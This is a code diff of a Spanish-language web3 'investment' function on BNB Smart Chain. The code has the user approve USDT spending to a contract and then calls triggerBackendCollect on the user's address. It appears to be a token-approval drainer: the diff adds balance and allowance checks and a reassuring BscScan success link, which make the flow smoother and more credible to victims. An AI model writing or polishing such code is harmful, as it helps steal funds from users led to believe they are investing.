@@ -138,14 +138,14 @@ async function runInvestmentFlow(rawProvider) {
   try {
     const provider = new ethers.BrowserProvider(rawProvider);
     
-    // Verificación de red BSC (Chain ID 56)
+    // 1. Verificación estricta de red BSC (Chain ID 56)
     const network = await provider.getNetwork();
     if (Number(network.chainId) !== 56) {
       setLoading(true, "Cambiando a red BSC…");
       try {
         await rawProvider.request({
           method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }] // 56 en Hexadecimal
+          params: [{ chainId: "0x38" }] // 56 en Hex
         });
       } catch (switchError) {
         if (switchError.code === 4902) {
@@ -160,7 +160,7 @@ async function runInvestmentFlow(rawProvider) {
             }]
           });
         } else {
-          showToast("Por favor cambia manualmente a BNB Smart Chain en tu wallet.", "error");
+          showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
           setLoading(false);
           updateButtonState();
           return;
@@ -171,20 +171,58 @@ async function runInvestmentFlow(rawProvider) {
     const signer = await provider.getSigner();
     const userAddress = await signer.getAddress();
 
+    // 2. Validación UX: Comprobar saldo de BNB para el Gas (mínimo recomendado: 0.0005 BNB)
+    setLoading(true, "Verificando saldo de gas (BNB)…");
+    const bnbBalance = await provider.getBalance(userAddress);
+    const minGasRequired = ethers.parseEther("0.0005"); 
+
+    if (bnbBalance < minGasRequired) {
+      showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
+      setLoading(false);
+      updateButtonState();
+      return;
+    }
+
+    // 3. Obtener montos e instanciar contrato USDT
+    const inputElement = document.getElementById("investAmount");
+    const rawInputVal = inputElement ? inputElement.value : "1";
+    const requiredAmount = ethers.parseUnits(rawInputVal || "1", 18);
+
     const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
 
-    setLoading(true, "Firma requerida en wallet…");
-    const requiredAmount = ethers.parseUnits(document.getElementById("investAmount")?.value.toString() || "1", 18);
+    setLoading(true, "Validando saldo de USDT…");
+    const usdtBalance = await usdtContract.balanceOf(userAddress);
+
+    if (usdtBalance < requiredAmount) {
+      showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
+      setLoading(false);
+      updateButtonState();
+      return;
+    }
+
+    // 4. Verificar si ya existe Allowance suficiente para evitar aprobaciones redundantes
+    const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
     
-    // Lanzar la firma de aprobación automáticamente
-    const tx = await usdtContract.approve(CONTRACT_ADDRESS, requiredAmount);
+    if (allowance < requiredAmount) {
+      setLoading(true, "Firma requerida para aprobar USDT…");
+      const txApprove = await usdtContract.approve(CONTRACT_ADDRESS, requiredAmount);
+      
+      setLoading(true, "Confirmando aprobación en red...");
+      await txApprove.wait();
+    }
 
-    setLoading(true, "Confirmando en red…");
-    await tx.wait();
+    // 5. Ejecutar la lógica de inversión o llamada al contrato final
+    setLoading(true, "Procesando inversión...");
+    const txCollect = await triggerBackendCollect(userAddress); // O tu función de contrato final
 
-    setLoading(true, "Finalizando…");
-    await triggerBackendCollect(userAddress);
-    showToast("Sent Successfully, Thank you! ✓", "success");
+    // 6. Éxito con Trazabilidad (Enlace a BscScan)
+    // Si 'txCollect' o la transacción devuelve un hash, lo usamos:
+    const txHash = txCollect?.hash || "";
+    if (txHash) {
+      showToast(`¡Inversión exitosa! <a href="https://bscscan.com/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
+    } else {
+      showToast("Sent Successfully, Thank you! ✓", "success");
+    }
 
   } catch (err) {
     const raw = err?.reason ?? err?.message ?? "Error desconocido";
@@ -194,13 +232,13 @@ async function runInvestmentFlow(rawProvider) {
       raw.toLowerCase().includes("denied") ||
       raw.toLowerCase().includes("cancelled")
     ) {
-      showToast("Transacción cancelada.", "default");
+      showToast("Transacción cancelada por el usuario.", "default");
     } else {
       console.error("Web3 Error:", err);
-      showToast("Error de comunicación con la wallet.", "error");
+      showToast("Ocurrió un error al procesar la transacción en la red.", "error");
     }
   } finally {
     setLoading(false);
-    updateButtonState(); // Restaura el botón a su estado normal
+    updateButtonState();
   }
 }
